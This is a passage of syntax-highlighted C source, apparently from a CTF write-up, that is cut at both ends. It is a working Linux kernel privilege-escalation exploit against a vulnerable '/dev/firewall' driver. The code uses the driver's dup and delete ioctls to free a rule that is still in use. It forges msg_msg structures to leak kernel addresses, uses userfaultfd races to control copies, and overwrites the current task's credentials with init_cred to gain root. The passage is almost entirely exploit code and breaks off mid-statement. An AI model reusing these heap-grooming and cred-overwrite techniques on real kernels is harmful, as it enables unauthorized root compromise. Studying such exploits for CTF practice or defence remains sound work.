class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_MSG ((size_t) PAGE_SIZE - sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_SEG ((size_t) PAGE_SIZE - sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf *) msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="type">void</span> *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.next = (<span class="type">void</span> *) m_list_next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.prev = (<span class="type">void</span> *) m_list_prev;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_type = (<span class="type">long</span>) m_type;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_ts = m_ts;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;next = (<span class="type">void</span> *) next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;security = (<span class="type">void</span> *) security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span> =</span> &#123;.api = UFFD_API, .features = <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint8_t</span> idx;</span><br><span class="line">    <span class="type">uint8_t</span> type;</span><br><span class="line">    <span class="type">uint16_t</span> proto;</span><br><span class="line">    <span class="type">uint16_t</span> port;</span><br><span class="line">    <span class="type">uint8_t</span> action;</span><br><span class="line">&#125; <span class="type">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> firewall_fd;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    INBOUND,</span><br><span class="line">    OUTBOUND</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">uint8_t</span> type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0x1337BABE</span>, &amp;(<span class="type">user_rule_t</span>) &#123;.type = type, .idx = idx, .ip = <span class="string">&quot;0.0.0.0&quot;</span>, .netmask = <span class="string">&quot;0.0.0.0&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">uint8_t</span> type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0xBAAD5AAD</span>, &amp;(<span class="type">user_rule_t</span>) &#123;.type = type, .idx = idx&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">uint8_t</span> type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0xDEADBABE</span>, &amp;(<span class="type">user_rule_t</span>) &#123;.type = type, .idx = idx&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inet_ntoa</span><span class="params">(<span class="type">char</span> *buf, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d.%d.%d.%d&quot;</span>, val &amp; <span class="number">0x000000FF</span>, (val &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>, (val &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>, (val &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">void</span> *buf, <span class="type">uint8_t</span> type, <span class="type">bool</span> invalid)</span> &#123;</span><br><span class="line">    <span class="type">user_rule_t</span> rule = &#123;.type = type, .idx = idx&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (invalid) &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(rule.ip, <span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(rule.netmask, <span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        inet_ntoa(rule.ip, *(<span class="type">uint32_t</span> *) &amp;buf[<span class="number">0x20</span>]);</span><br><span class="line">        inet_ntoa(rule.netmask, *(<span class="type">uint32_t</span> *) &amp;buf[<span class="number">0x24</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule.proto, &amp;buf[<span class="number">0x28</span>], <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule.port, &amp;buf[<span class="number">0x2a</span>], <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule.action, &amp;buf[<span class="number">0x2c</span>], <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0x1337BEEF</span>, &amp;rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x40</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125; small_msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[DATALEN_MSG + DATALEN_SEG];</span><br><span class="line">&#125; large_msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[DATALEN_MSG + DATALEN_SEG];</span><br><span class="line">&#125; oob_msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> fake_msg[<span class="number">0x2000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF81C33060</span>;</span><br><span class="line"><span class="type">size_t</span> init_task = <span class="number">0xFFFFFFFF81C124C0</span>;</span><br><span class="line"><span class="type">size_t</span> cur_task, large_msg_addr = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> msq_id[<span class="number">4</span>];</span><br><span class="line"><span class="type">bool</span> steps[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASKS_OFFSET 0x298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PID_OFFSET 0x398</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_OFFSET 0x540</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">change_next_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        steps[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (!steps[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">char</span> *page_buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        build_msg(page_buf + DATALEN_MSG - <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, DATALEN_MSG + <span class="number">0x10</span>, cur_task + CRED_OFFSET - <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">size_t</span>) page_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">size_t</span>) msg.arg.pagefault.address &amp; ~(<span class="number">0xFFF</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.src: %p\n&quot;</span>, uffdio_copy.src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = PAGE_SIZE * <span class="number">2</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">change_cred_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        steps[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (!steps[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *page_buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        *(<span class="type">size_t</span> *) &amp;page_buf[DATALEN_MSG] = init_cred;</span><br><span class="line">        *(<span class="type">size_t</span> *) &amp;page_buf[DATALEN_MSG + <span class="number">8</span>] = init_cred;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">size_t</span>) page_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">size_t</span>) msg.arg.pagefault.address &amp; ~(<span class="number">0xFFF</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.src: %p\n&quot;</span>, uffdio_copy.src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = PAGE_SIZE * <span class="number">2</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">change_next</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *change_next_page = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">3</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(change_next_page, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">    register_userfaultfd(change_next_page + PAGE_SIZE, PAGE_SIZE * <span class="number">2</span>, change_next_thread);</span><br><span class="line">    msq_id[<span class="number">2</span>] = get_msg_queue();</span><br><span class="line">    write_msg(msq_id[<span class="number">2</span>], change_next_page + PAGE_SIZE - <span class="number">8</span>, DATALEN_MSG + DATALEN_MSG, <span class="number">1</span>);</span><br><span class="line">    steps[<span class="number">2</span>] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">change_cred</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (!steps[<span class="number">0</span>]);</span><br><span class="line">    build_msg(fake_msg, init_task + <span class="number">0x1000</span>, init_task + <span class="number">0x1000</span>, <span class="number">123</span>, <span class="keyword">sizeof</span>(small_msgbuf.mtext), large_msg_addr, <span class="number">0</span>);</span><br><span class="line">    edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">false</span>);</span><br><span class="line">    read_msg(msq_id[<span class="number">0</span>], &amp;large_msgbuf, <span class="keyword">sizeof</span>(large_msgbuf.mtext), <span class="number">123</span>);</span><br><span class="line">    <span class="type">char</span> *change_cred_page = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">3</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(change_cred_page, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">    register_userfaultfd(change_cred_page + PAGE_SIZE, PAGE_SIZE * <span class="number">2</span>, change_cred_thread);</span><br><span class="line">    msq_id[<span class="number">3</span>] = get_msg_queue();</span><br><span class="line">    write_msg(msq_id[<span class="number">3</span>], change_cred_page + PAGE_SIZE - <span class="number">8</span>, DATALEN_MSG + <span class="number">0x10</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    firewall_fd = open(<span class="string">&quot;/dev/firewall&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (firewall_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to open firewall.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add_rule(<span class="number">0</span>, INBOUND);</span><br><span class="line">    dup_rule(<span class="number">0</span>, INBOUND);</span><br><span class="line">    delete_rule(<span class="number">0</span>, INBOUND);</span><br><span class="line"></span><br><span class="line">    msq_id[<span class="number">0</span>] = get_msg_queue();</span><br><span class="line">    msq_id[<span class="number">1</span>] = get_msg_queue();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(small_msgbuf.mtext, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(small_msgbuf.mtext));</span><br><span class="line">    write_msg(msq_id[<span class="number">0</span>], &amp;small_msgbuf, <span class="keyword">sizeof</span>(small_msgbuf.mtext), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(small_msgbuf.mtext, <span class="string">&#x27;b&#x27;</span>, <span class="keyword">sizeof</span>(small_msgbuf.mtext));</span><br><span class="line">    write_msg(msq_id[<span class="number">1</span>], &amp;small_msgbuf, <span class="keyword">sizeof</span>(small_msgbuf.mtext), <span class="number">0x114514</span>);</span><br><span class="line">    <span class="built_in">memset</span>(large_msgbuf.mtext, <span class="string">&#x27;c&#x27;</span>, <span class="keyword">sizeof</span>(large_msgbuf.mtext));</span><br><span class="line">    write_msg(msq_id[<span class="number">1</span>], &amp;large_msgbuf, <span class="keyword">sizeof</span>(large_msgbuf.mtext), <span class="number">0x1919810</span>);</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">114514</span>, DATALEN_MSG, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">memset</span>(oob_msgbuf.mtext, <span class="number">0</span>, DATALEN_MSG);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] peek_msg len: %p\n&quot;</span>, peek_msg(msq_id[<span class="number">0</span>], &amp;oob_msgbuf, DATALEN_MSG, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_msg.m_type: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak kernel addr from shm_file_data&quot;</span>, oob_msgbuf.mtext, DATALEN_MSG);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="keyword">sizeof</span>(small_msgbuf.mtext); i + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) &lt; DATALEN_MSG; i += <span class="number">0x40</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span> =</span> (<span class="type">void</span> *) &amp;oob_msgbuf.mtext[i];</span><br><span class="line">        <span class="keyword">if</span> (is_dir_mapping_addr((<span class="type">size_t</span>) msg-&gt;m_list.next)</span><br><span class="line">            &amp;&amp; is_dir_mapping_addr((<span class="type">size_t</span>) msg-&gt;m_list.prev)</span><br><span class="line">            &amp;&amp; msg-&gt;m_type == <span class="number">0x114514</span> &amp;&amp; msg-&gt;m_ts == <span class="keyword">sizeof</span>(small_msgbuf.mtext)) &#123;</span><br><span class="line">            large_msg_addr = (<span class="type">size_t</span>) msg-&gt;m_list.next;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (large_msg_addr == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to find large msg_msg addr.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] large msg addr: %p\n&quot;</span>, large_msg_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_offset = search_kernel_offset(oob_msgbuf.mtext, DATALEN_MSG);</span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] filed to find kernel offset.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    init_task += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_cred addr: %#lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_task addr: %#lx\n&quot;</span>, init_task);</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1919810</span>, DATALEN_MSG + DATALEN_SEG, init_task + TASKS_OFFSET - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(oob_msgbuf.mtext, <span class="number">0</span>, DATALEN_MSG + DATALEN_SEG);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] peek_msg len: 